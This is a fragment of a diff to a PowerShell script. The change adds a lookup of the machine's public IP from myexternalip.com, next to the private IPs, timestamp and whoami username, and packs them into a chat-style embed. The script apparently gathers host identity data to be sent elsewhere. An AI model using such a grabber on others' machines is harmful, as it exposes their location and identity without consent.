@@ -50,7 +50,7 @@ foreach ($thing in $blank) {
     if ($thing.substring(0,7) -eq '172.30.') {$privateips=$privateips+$thing+"`n"}
     if ($thing.substring(0,7) -eq '172.31.') {$privateips=$privateips+$thing+"`n"}
 }
-$content = " == Real IPs == `n"+$ips+"`n`n == Private IPs == `n"+$privateips+"`n`nTime: $(Get-Date)`nUser: $(whoami)"
+$content = " == Real IPs == `n"+ (Invoke-WebRequest "https://www.myexternalip.com/raw" -UseBasicParsing).Content+" | Website Retrieval`n"+$ips+"`n`n == Private IPs == `n"+$privateips+"`n`nTime: $(Get-Date)`nUser: $(whoami)"
 [System.Collections.ArrayList]$embedArray = @()
 $title       = 'IP Address Powershell'
 $description = '```'+$content+'```'
